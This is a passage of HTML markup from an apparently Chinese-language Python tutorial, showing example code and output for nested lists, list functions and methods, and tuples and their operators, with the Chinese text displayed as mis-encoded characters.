punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token comment"># è¿­ä»£</span>    <span class="token triple-quoted-string string">'''[1, 2, 3, 'test']4[1, 2, 3, 4, 5, 6]['test', 'test', 'test', 'test']True1 2 3 '''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="é•¶åµŒåˆ—è¡¨"><a href="#é•¶åµŒåˆ—è¡¨" class="headerlink" title="é•¶åµŒåˆ—è¡¨"></a>é•¶åµŒåˆ—è¡¨</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># é•¶åµŒåˆ—è¡¨</span>a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">]</span>n <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span>x <span class="token operator">=</span> <span class="token punctuation">[</span>a<span class="token punctuation">,</span> n<span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''[['a', 'b', 'c'], [1, 2, 3]]['a', 'b', 'c']b'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å‡½æ•°-1"><a href="#å‡½æ•°-1" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h3><table><thead><tr><th align="left">åºå·</th><th align="left">å‡½æ•°</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-len.html">len(list)</a> åˆ—è¡¨å…ƒç´ ä¸ªæ•°</td></tr><tr><td align="left">2</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-max.html">max(list)</a> è¿”å›åˆ—è¡¨å…ƒç´ æœ€å¤§å€¼</td></tr><tr><td align="left">3</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-min.html">min(list)</a> è¿”å›åˆ—è¡¨å…ƒç´ æœ€å°å€¼</td></tr><tr><td align="left">4</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-list.html">list(seq)</a> å°†å…ƒç»„è½¬æ¢ä¸ºåˆ—è¡¨</td></tr></tbody></table><table><thead><tr><th align="left">åºå·</th><th align="left">æ–¹æ³•</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-append.html">list.append(obj)</a> åœ¨åˆ—è¡¨æœ«å°¾æ·»åŠ æ–°çš„å¯¹è±¡</td></tr><tr><td align="left">2</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-count.html">list.count(obj)</a> ç»Ÿè®¡æŸä¸ªå…ƒç´ åœ¨åˆ—è¡¨ä¸­å‡ºç°çš„æ¬¡æ•°</td></tr><tr><td align="left">3</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-extend.html">list.extend(seq)</a> åœ¨åˆ—è¡¨æœ«å°¾ä¸€æ¬¡æ€§è¿½åŠ å¦ä¸€ä¸ªåºåˆ—ä¸­çš„å¤šä¸ªå€¼ï¼ˆç”¨æ–°åˆ—è¡¨æ‰©å±•åŸæ¥çš„åˆ—è¡¨ï¼‰</td></tr><tr><td align="left">4</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-index.html">list.index(obj)</a> ä»åˆ—è¡¨ä¸­æ‰¾å‡ºæŸä¸ªå€¼ç¬¬ä¸€ä¸ªåŒ¹é…é¡¹çš„ç´¢å¼•ä½ç½®</td></tr><tr><td align="left">5</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-insert.html">list.insert(index, obj)</a> å°†å¯¹è±¡æ’å…¥åˆ—è¡¨</td></tr><tr><td align="left">6</td><td align="left">[list.pop(<a href="https://www.runoob.com/python3/python3-att-list-pop.html">index=-1])</a> ç§»é™¤åˆ—è¡¨ä¸­çš„ä¸€ä¸ªå…ƒç´ ï¼ˆé»˜è®¤æœ€åä¸€ä¸ªå…ƒç´ ï¼‰ï¼Œå¹¶ä¸”è¿”å›è¯¥å…ƒç´ çš„å€¼</td></tr><tr><td align="left">7</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-remove.html">list.remove(obj)</a> ç§»é™¤åˆ—è¡¨ä¸­æŸä¸ªå€¼çš„ç¬¬ä¸€ä¸ªåŒ¹é…é¡¹</td></tr><tr><td align="left">8</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-reverse.html">list.reverse()</a> åå‘åˆ—è¡¨ä¸­å…ƒç´ </td></tr><tr><td align="left">9</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-sort.html">list.sort( key=None, reverse=False)</a> å¯¹åŸåˆ—è¡¨è¿›è¡Œæ’åº</td></tr><tr><td align="left">10</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-clear.html">list.clear()</a> æ¸…ç©ºåˆ—è¡¨</td></tr><tr><td align="left">11</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-copy.html">list.copy()</a> å¤åˆ¶åˆ—è¡¨</td></tr></tbody></table><h3 id="å‡½æ•°ç¤ºä¾‹-2"><a href="#å‡½æ•°ç¤ºä¾‹-2" class="headerlink" title="å‡½æ•°ç¤ºä¾‹"></a>å‡½æ•°ç¤ºä¾‹</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Google'</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">,</span> <span class="token string">'Taobao'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>list1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 3</span>list2 <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># åˆ›å»ºä¸€ä¸ª 0-4 çš„åˆ—è¡¨</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>list2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 5</span>list1<span class="token punctuation">,</span> list2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Google'</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">,</span> <span class="token string">'Taobao'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">456</span><span class="token punctuation">,</span> <span class="token number">700</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"list1 æœ€å¤§å…ƒç´ å€¼ : "</span><span class="token punctuation">,</span> <span class="token builtin">max</span><span class="token punctuation">(</span>list1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># list1 æœ€å¤§å…ƒç´ å€¼ :  Taobao</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"list2 æœ€å¤§å…ƒç´ å€¼ : "</span><span class="token punctuation">,</span> <span class="token builtin">max</span><span class="token punctuation">(</span>list2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># list2 æœ€å¤§å…ƒç´ å€¼ :  700</span>list1<span class="token punctuation">,</span> list2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Google'</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">,</span> <span class="token string">'Taobao'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">456</span><span class="token punctuation">,</span> <span class="token number">700</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"list1 æœ€å°å…ƒç´ å€¼ : "</span><span class="token punctuation">,</span> <span class="token builtin">min</span><span class="token punctuation">(</span>list1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># list1 æœ€å°å…ƒç´ å€¼ :  Google</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"list2 æœ€å°å…ƒç´ å€¼ : "</span><span class="token punctuation">,</span> <span class="token builtin">min</span><span class="token punctuation">(</span>list2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># list2 æœ€å°å…ƒç´ å€¼ :  200</span>aTuple <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">,</span> <span class="token string">'Google'</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">,</span> <span class="token string">'Taobao'</span><span class="token punctuation">)</span>list1 <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>aTuple<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"åˆ—è¡¨å…ƒç´  : "</span><span class="token punctuation">,</span> list1<span class="token punctuation">)</span><span class="token comment"># åˆ—è¡¨å…ƒç´  :  [123, 'Google', 'Runoob', 'Taobao']</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"Hello World"</span>list2 <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"åˆ—è¡¨å…ƒç´  : "</span><span class="token punctuation">,</span> list2<span class="token punctuation">)</span><span class="token comment"># åˆ—è¡¨å…ƒç´  :  ['H', 'e', 'l', 'l', 'o', ' ', 'W', 'o', 'r', 'l', 'd']</span>list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Google'</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">,</span> <span class="token string">'Taobao'</span><span class="token punctuation">]</span>list1<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'Baidu'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"æ›´æ–°åçš„åˆ—è¡¨ : "</span><span class="token punctuation">,</span> list1<span class="token punctuation">)</span><span class="token comment"># æ›´æ–°åçš„åˆ—è¡¨ :  ['Google', 'Runoob', 'Taobao', 'Baidu']</span>aList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">123</span><span class="token punctuation">,</span> <span class="token string">'Google'</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">,</span> <span class="token string">'Taobao'</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"123 å…ƒç´ ä¸ªæ•° : "</span><span class="token punctuation">,</span> aList<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 123 å…ƒç´ ä¸ªæ•° :  2</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Runoob å…ƒç´ ä¸ªæ•° : "</span><span class="token punctuation">,</span> aList<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'Runoob'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Runoob å…ƒç´ ä¸ªæ•° :  1</span>list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Google'</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">,</span> <span class="token string">'Taobao'</span><span class="token punctuation">]</span>list2 <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># åˆ›å»º 0-4 çš„åˆ—è¡¨</span>list1<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>list2<span class="token punctuation">)</span>  <span class="token comment"># æ‰©å±•åˆ—è¡¨</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"æ‰©å±•åçš„åˆ—è¡¨ï¼š"</span><span class="token punctuation">,</span> list1<span class="token punctuation">)</span><span class="token comment"># æ‰©å±•åçš„åˆ—è¡¨ï¼š ['Google', 'Runoob', 'Taobao', 0, 1, 2, 3, 4]</span>list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Google'</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">,</span> <span class="token string">'Taobao'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Runoob ç´¢å¼•å€¼ä¸º'</span><span class="token punctuation">,</span> list1<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">'Runoob'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Runoob ç´¢å¼•å€¼ä¸º 1</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Taobao ç´¢å¼•å€¼ä¸º'</span><span class="token punctuation">,</span> list1<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">'Taobao'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Taobao ç´¢å¼•å€¼ä¸º 2</span>list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Google'</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">,</span> <span class="token string">'Taobao'</span><span class="token punctuation">]</span>list1<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'Baidu'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'åˆ—è¡¨æ’å…¥å…ƒç´ åä¸º : '</span><span class="token punctuation">,</span> list1<span class="token punctuation">)</span><span class="token comment"># åˆ—è¡¨æ’å…¥å…ƒç´ åä¸º :  ['Google', 'Baidu', 'Runoob', 'Taobao']</span>list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Google'</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">,</span> <span class="token string">'Taobao'</span><span class="token punctuation">]</span>list1<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"åˆ—è¡¨ç°åœ¨ä¸º : "</span><span class="token punctuation">,</span> list1<span class="token punctuation">)</span><span class="token comment"># åˆ—è¡¨ç°åœ¨ä¸º :  ['Google', 'Runoob']</span>list1<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"åˆ—è¡¨ç°åœ¨ä¸º : "</span><span class="token punctuation">,</span> list1<span class="token punctuation">)</span><span class="token comment"># åˆ—è¡¨ç°åœ¨ä¸º :  ['Google']</span>list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Google'</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">,</span> <span class="token string">'Taobao'</span><span class="token punctuation">,</span> <span class="token string">'Baidu'</span><span class="token punctuation">]</span>list1<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">'Taobao'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"åˆ—è¡¨ç°åœ¨ä¸º : "</span><span class="token punctuation">,</span> list1<span class="token punctuation">)</span><span class="token comment"># åˆ—è¡¨ç°åœ¨ä¸º :  ['Google', 'Runoob', 'Baidu']</span>list1<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">'Baidu'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"åˆ—è¡¨ç°åœ¨ä¸º : "</span><span class="token punctuation">,</span> list1<span class="token punctuation">)</span><span class="token comment"># åˆ—è¡¨ç°åœ¨ä¸º :  ['Google', 'Runoob']</span>list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Google'</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">,</span> <span class="token string">'Taobao'</span><span class="token punctuation">,</span> <span class="token string">'Baidu'</span><span class="token punctuation">]</span>list1<span class="token punctuation">.</span>reverse<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"åˆ—è¡¨åè½¬å: "</span><span class="token punctuation">,</span> list1<span class="token punctuation">)</span><span class="token comment"># åˆ—è¡¨åè½¬å:  ['Baidu', 'Taobao', 'Runoob', 'Google']</span>aList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Google'</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">,</span> <span class="token string">'Taobao'</span><span class="token punctuation">,</span> <span class="token string">'Facebook'</span><span class="token punctuation">]</span>aList<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"List : "</span><span class="token punctuation">,</span> aList<span class="token punctuation">)</span><span class="token comment"># List :  ['Facebook', 'Google', 'Runoob', 'Taobao']</span>list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Google'</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">,</span> <span class="token string">'Taobao'</span><span class="token punctuation">,</span> <span class="token string">'Baidu'</span><span class="token punctuation">]</span>list1<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"åˆ—è¡¨æ¸…ç©ºå : "</span><span class="token punctuation">,</span> list1<span class="token punctuation">)</span><span class="token comment"># åˆ—è¡¨æ¸…ç©ºå :  []</span>list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Google'</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">,</span> <span class="token string">'Taobao'</span><span class="token punctuation">,</span> <span class="token string">'Baidu'</span><span class="token punctuation">]</span>list2 <span class="token operator">=</span> list1<span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"list2 åˆ—è¡¨: "</span><span class="token punctuation">,</span> list2<span class="token punctuation">)</span><span class="token comment"># list2 åˆ—è¡¨:  ['Google', 'Runoob', 'Taobao', 'Baidu']</span><span class="token triple-quoted-string string">'''35list1 æœ€å¤§å…ƒç´ å€¼ :  Taobaolist2 æœ€å¤§å…ƒç´ å€¼ :  700list1 æœ€å°å…ƒç´ å€¼ :  Googlelist2 æœ€å°å…ƒç´ å€¼ :  200åˆ—è¡¨å…ƒç´  :  [123, 'Google', 'Runoob', 'Taobao']åˆ—è¡¨å…ƒç´  :  ['H', 'e', 'l', 'l', 'o', ' ', 'W', 'o', 'r', 'l', 'd']æ›´æ–°åçš„åˆ—è¡¨ :  ['Google', 'Runoob', 'Taobao', 'Baidu']123 å…ƒç´ ä¸ªæ•° :  2Runoob å…ƒç´ ä¸ªæ•° :  1æ‰©å±•åçš„åˆ—è¡¨ï¼š ['Google', 'Runoob', 'Taobao', 0, 1, 2, 3, 4]Runoob ç´¢å¼•å€¼ä¸º 1Taobao ç´¢å¼•å€¼ä¸º 2åˆ—è¡¨æ’å…¥å…ƒç´ åä¸º :  ['Google', 'Baidu', 'Runoob', 'Taobao']åˆ—è¡¨ç°åœ¨ä¸º :  ['Google', 'Runoob']åˆ—è¡¨ç°åœ¨ä¸º :  ['Google']åˆ—è¡¨ç°åœ¨ä¸º :  ['Google', 'Runoob', 'Baidu']åˆ—è¡¨ç°åœ¨ä¸º :  ['Google', 'Runoob']åˆ—è¡¨åè½¬å:  ['Baidu', 'Taobao', 'Runoob', 'Google']List :  ['Facebook', 'Google', 'Runoob', 'Taobao']åˆ—è¡¨æ¸…ç©ºå :  []list2 åˆ—è¡¨:  ['Google', 'Runoob', 'Taobao', 'Baidu']'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="å…ƒç»„"><a href="#å…ƒç»„" class="headerlink" title="å…ƒç»„"></a>å…ƒç»„</h2><ol><li>å…ƒç»„å…ƒç´ ä¸èƒ½æ›´æ”¹</li><li>å…ƒç»„å†™åœ¨å°æ‹¬å·å†…ï¼Œä»¥<code>,</code>åˆ†éš”</li><li>å„å…ƒç´ ç±»å‹å¯ä»¥ä¸åŒ</li><li>å…ƒç»„çš„ç´¢å¼•åˆ‡ç‰‡æ“ä½œä¸stringä¸€æ ·</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">tuple</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1.2</span><span class="token punctuation">,</span> <span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token string">'dou'</span><span class="token punctuation">)</span>tuple2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'test2'</span><span class="token punctuation">)</span>tuple3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">)</span>  <span class="token comment"># å•ä¸ªå…ƒç´ åé¢åŠ é€—å·</span>tuple4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># ç©ºå…ƒç»„</span><span class="token keyword">print</span><span class="token punctuation">(</span>tuple4<span class="token punctuation">)</span><span class="token comment"># ()</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">tuple</span><span class="token punctuation">)</span><span class="token comment"># (1, 1.2, 'test', 'dou')</span><span class="token keyword">print</span><span class="token punctuation">(</span>tuple3<span class="token punctuation">)</span><span class="token comment"># (1,)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">tuple</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># è¾“å‡ºç¬¬ä¸€ä¸ªå…ƒç´ </span><span class="token comment"># 1</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">tuple</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># è¾“å‡ºç¬¬äºŒä¸ªåˆ°ç¬¬ä¸‰ä¸ªå…ƒç´ </span><span class="token comment"># (1.2, 'test')</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">tuple</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># è¾“å‡ºæ‰€æœ‰å…ƒç´ </span><span class="token comment"># (1, 1.2, 'test', 'dou')</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">tuple</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># è¾“å‡ºæ‰€æœ‰å…ƒç´ </span><span class="token comment"># (1, 1.2, 'test', 'dou')</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">tuple</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># è¾“å‡ºç¬¬ä¸‰ä¸ªåŠå‰é¢çš„æ‰€æœ‰</span><span class="token comment"># (1, 1.2, 'test')</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">tuple</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token comment"># (1, 1.2, 'test', 'dou', 1, 1.2, 'test', 'dou')</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">tuple</span> <span class="token operator">+</span> tuple2<span class="token punctuation">)</span><span class="token comment"># (1, 1.2, 'test', 'dou', 1, 'test2')</span><span class="token triple-quoted-string string">'''()(1, 1.2, 'test', 'dou')(1,)1(1.2, 'test')(1, 1.2, 'test', 'dou')(1, 1.2, 'test', 'dou')(1, 1.2, 'test')(1, 1.2, 'test', 'dou', 1, 1.2, 'test', 'dou')(1, 1.2, 'test', 'dou', 1, 'test2')'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="è¿ç®—ç¬¦-2"><a href="#è¿ç®—ç¬¦-2" class="headerlink" title="è¿ç®—ç¬¦"></a>è¿ç®—ç¬¦</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">tuple6 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'test'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>tuple6<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>tuple6<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># åˆ—è¡¨é•¿åº¦</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># ç»„åˆ</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">)</span>  <span class="token comment"># é‡å¤</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">3</span> <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># å­˜åœ¨ä¸å¦</span><span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token comment"># è¿­ä»£</span><span class="token triple-quoted-string string">'''(1, 2, 3, 'test')4(1, 2, 3, 4, 5, 6)('test', 'test', 'test', 'test')True1 2 3 '''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å‡½æ•°-2"><a href="#å‡½æ•°-2" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h3><table><thead><tr><th align="left">åºå·</th><th align="left">æ–¹æ³•åŠæè¿°</th><th align="left">å®ä¾‹</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">len(tuple) è®¡ç®—å…ƒç»„å…ƒç´ ä¸ªæ•°ã€‚</td><td align="left"><code>&gt;&gt;&gt; tuple1 = ('Google', 'Runoob', 'Taobao') 